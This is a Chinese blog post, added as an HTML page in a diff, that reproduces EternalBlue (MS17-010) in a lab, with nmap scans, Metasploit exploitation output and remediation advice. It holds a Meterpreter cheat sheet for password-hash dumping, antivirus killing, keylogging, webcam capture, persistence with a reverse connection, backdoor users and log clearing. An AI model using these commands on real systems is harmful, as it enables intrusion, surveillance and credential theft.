@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - 永恒之蓝漏洞复现</title>
+        <meta name="description" content="乱拳捶死老师傅，给牢玩家电脑上都种上马子(汪汪) 漏洞原理 永恒之蓝漏洞通过 TCP 的445和139端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。可以在其电脑或服务器中植入勒索病毒、…">
+    <link rel="canonical" href="https://the0n3.top/pages/e58824/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="永恒之蓝漏洞复现">
+    <meta property="og:description" content="乱拳捶死老师傅，给牢玩家电脑上都种上马子(汪汪) 漏洞原理 永恒之蓝漏洞通过 TCP 的445和139端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。可以在其电脑或服务器中植入勒索病毒、…">
+    <meta property="og:url" content="https://the0n3.top/pages/e58824/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/7.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="永恒之蓝漏洞复现">
+    <meta name="twitter:description" content="乱拳捶死老师傅，给牢玩家电脑上都种上马子(汪汪) 漏洞原理 永恒之蓝漏洞通过 TCP 的445和139端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。可以在其电脑或服务器中植入勒索病毒、…">
+        <meta name="twitter:image" content="https://the0n3.top/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/7.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>永恒之蓝漏洞复现</h1>
+    <p>
+        <span class="meta">发布于: 2024-12-03 19:49</span>
+    </p>
+    <div class="post-body">
+        <p>乱拳捶死老师傅，给牢玩家电脑上都种上马子(汪汪)</p>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/7.png" alt="7" decoding="async" width="1918" height="888"></p>
+<!-- more -->
+<h2>漏洞原理</h2>
+<p>永恒之蓝漏洞通过 TCP 的445和139端口，来利用 <strong>SMBv1</strong> 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。可以在其电脑或服务器中植入勒索病毒、窃取用户隐私、远程控制木马等恶意程序</p>
+<p>关键：445端口开启了<strong>SMBv1</strong>文件共享服务(敏感特征)</p>
+<h2>影响范围</h2>
+<p>WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0、Windows 7、Windows 8</p>
+<h2>环境</h2>
+<p>靶机： </p>
+<ul>
+<li>windows server 2008 R2</li>
+<li>IP: 192.168.237.146</li>
+</ul>
+<p>攻击机：</p>
+<ul>
+<li>kali</li>
+<li>IP: 192.168.237.128</li>
+</ul>
+<h2>利用</h2>
+<p>nmap扫描同网段存活主机</p>
+<pre><code class="language-bash">sudo nmap -sS 192.168.237.0/24</code></pre>
+<pre><code class="language-plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:01 CST
+Nmap scan report for bogon (192.168.237.1)
+Host is up (0.00022s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+3306/tcp open  mysql
+MAC Address: 00:50:56:C0:00:08 (VMware)
+
+Nmap scan report for bogon (192.168.237.2)
+Host is up (0.000062s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+53/tcp open  domain                                                                                                           
+MAC Address: 00:50:56:E6:05:63 (VMware)                                                                                       
+
+Nmap scan report for bogon (192.168.237.146)                                                                                  
+Host is up (0.00029s latency).                                                                                                
+Not shown: 997 filtered tcp ports (no-response)                                                                               
+PORT      STATE SERVICE                                                                                                       
+135/tcp   open  msrpc                                                                                                         
+445/tcp   open  microsoft-ds                                                                                                  
+49154/tcp open  unknown
+MAC Address: 00:0C:29:10:87:59 (VMware)
+
+Nmap scan report for bogon (192.168.237.254)
+Host is up (0.00017s latency).
+All 1000 scanned ports on bogon (192.168.237.254) are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+MAC Address: 00:50:56:EE:8C:A5 (VMware)
+
+Nmap scan report for bogon (192.168.237.128)
+Host is up (0.0000080s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 10.35 seconds</code></pre>
+<ul>
+<li>
+<p>192.168.237.146是windows server 2008 R2  开启了445端口</p>
+</li>
+<li>
+<p>192.168.237.128是kali</p>
+</li>
+<li>
+<p>192.168.237.2是dns服务器</p>
+</li>
+<li>
+<p>192.168.237.254是网关</p>
+</li>
+<li>
+<p>192.168.237.1是物理主机</p>
+</li>
+</ul>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/1.png" alt="1" decoding="async" loading="lazy" width="1118" height="888"></p>
+<p>nmap扫描目标主机操作系统类型</p>
+<pre><code class="language-bash">sudo nmap -sV 192.168.237.146</code></pre>
+<p>拿到操作系统信息：<code>Windows Server 2008 R2 - 2012;</code></p>
+<pre><code class="language-plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:22 CST
+Nmap scan report for bogon (192.168.237.146)
+Host is up (0.00039s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+49154/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:10:87:59 (VMware)
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.16 seconds</code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/2.png" alt="2" decoding="async" loading="lazy" width="1427" height="502"></p>
+<p>nmap自带脚本扫描目标主机可能存在的漏洞</p>
+<pre><code class="language-bash">sudo nmap --script=vuln 192.168.237.146</code></pre>
+<p>该设备存在 <code>MS17-010</code> 漏洞，即 <code>EternalBlue</code> 漏洞</p>
+<pre><code class="language-plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:26 CST
+Nmap scan report for bogon (192.168.237.146)
+Host is up (0.00034s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+445/tcp   open  microsoft-ds
+49154/tcp open  unknown
+MAC Address: 00:0C:29:10:87:59 (VMware)
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+
+Nmap done: 1 IP address (1 host up) scanned in 43.51 seconds</code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/3.png" alt="3" decoding="async" loading="lazy" width="1918" height="888"></p>
+<p>Metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具，因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。</p>
+<p>使用<code>Metasploit Framework(MSF)</code>工具打靶，启动<code>msf</code></p>
+<pre><code class="language-bash">msfconsole</code></pre>
+<p>搜索永恒之蓝漏洞利用模块</p>
+<pre><code class="language-bash">search ms17_010</code></pre>
+<p>看到漏洞模块里的永恒之蓝漏洞</p>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/4.png" alt="4" decoding="async" loading="lazy" width="1918" height="888"></p>
+<p>使用永恒之蓝漏洞模块</p>
+<pre><code class="language-bash">use 1</code></pre>
+<p>显示该漏洞模块配置项</p>
+<pre><code class="language-bash">show options</code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/5.png" alt="5" decoding="async" loading="lazy" width="1918" height="888"></p>
+<p>set命令设置靶机ip地址</p>
+<pre><code class="language-bash">set rhost 192.168.237.146</code></pre>
+<p>使用<code>run</code>命令或者<code>exploit</code>命令执行漏洞利用</p>
+<pre><code class="language-bash">run</code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/6.png" alt="6" decoding="async" loading="lazy" width="1918" height="888"></p>
+<p>运行结束后，底部出现<code>meterpreter</code>，说明成功获取到目标主机的shell权限</p>
+<pre><code class="language-plaintext">[*] 192.168.237.146:445 - Sending egg to corrupted connection.
+[*] 192.168.237.146:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201798 bytes) to 192.168.237.146
+[+] 192.168.237.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.237.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.237.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (192.168.237.128:4444 -&gt; 192.168.237.146:49158) at 2024-12-03 20:52:38 +0800
+
+meterpreter &gt; </code></pre>
+<p>运行成功会出现<code>meterpreter &gt;</code>
+Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，
+对目标系统进行更深入的渗透，如获取屏幕、上传/下载文件、创建持久后门等。</p>
+<p>获取远程靶机的屏幕截图，使用<code>screenshot</code>命令</p>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/7.png" alt="7" decoding="async" loading="lazy" width="1918" height="888"></p>
+<p>获取目标靶机shell，使用<code>shell</code>命令，使用<code>chcp 65001</code>可以解决终端乱码的问题</p>
+<pre><code class="language-bash">shell
+chcp 65001</code></pre>
+<p>拿到系统最高权限</p>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/8.png" alt="8" decoding="async" loading="lazy" width="954" height="489"></p>
+<h2>关于拿到权限后的渗透</h2>
+<p>参考大佬给出的命令，做点恶趣味。<strong>抱歉，有权限是真的可以为所欲为(汪汪)</strong></p>
+<p>在meterpreter &gt;中，我们可以使用以下命令来实现对目标的操作</p>
+<pre><code class="language-bash">sysinfo             #查看目标主机系统信息
+run scraper         #查看目标主机详细信息
+run hashdump        #导出密码的哈希
+load kiwi           #加载
+ps                  #查看目标主机进程信息
+pwd                 #查看目标当前目录(windows)
+getlwd              #查看目标当前目录(Linux)
+search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
+download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
+upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程
+PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
+idletime            #查看主机运行时间
+getuid              #查看获取的当前权限
+getsystem           #提权
+run  killav         #关闭杀毒软件
+screenshot          #截图
+webcam_list         #查看目标主机的摄像头
+webcam_snap         #拍照
+webcam_stream       #开视频
+execute  参数  -f 可执行文件   #执行可执行程序
+run getgui -u hack -p 123    #创建hack用户，密码为123
+run getgui -e                #开启远程桌面
+keyscan_start                #开启键盘记录功能
+keyscan_dump                 #显示捕捉到的键盘记录信息
+keyscan_stop                 #停止键盘记录功能
+uictl  disable  keyboard     #禁止目标使用键盘
+uictl  enable   keyboard     #允许目标使用键盘
+uictl  disable  mouse        #禁止目标使用鼠标
+uictl  enable   mouse        #允许目标使用鼠标
+load                         #使用扩展库
+run                          #使用扩展库
+run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接
+                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀
+portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
+clearev                       #清除日志</code></pre>
+<p>查看系统信息</p>
+<pre><code class="language-bash">meterpreter &gt; sysinfo             #查看目标主机系统信息
+Computer        : WIN-C34GBVP79PU
+OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : zh_CN
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows</code></pre>
+<h2>修复建议</h2>
+<ul>
+<li>禁用SMB 1.0协议（或关闭端口445）</li>
+<li>安装MS17-010相关安全补丁</li>
+<li>使用网络隔离或防火墙规则减少暴露面</li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a href="https://blog.csdn.net/qq_61839115/article/details/129951295">【ms17-010】永恒之蓝漏洞复现</a></li>
+<li><a href="https://xz.aliyun.com/t/14485?time__1311=GqAxuQi%3DGQoCqGNDQiiQtwO6D97mCb7F4D#toc-12">内网渗透之ms07010的多种打法</a></li>
+<li><a href="https://www.freebuf.com/vuls/324486.html">永恒之蓝漏洞复现实验</a></li>
+<li><a href="https://cjjkkk.github.io/ms17-010%E5%A4%8D%E7%8E%B0/">ms17-010（永恒之蓝）漏洞复现</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#渗透</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
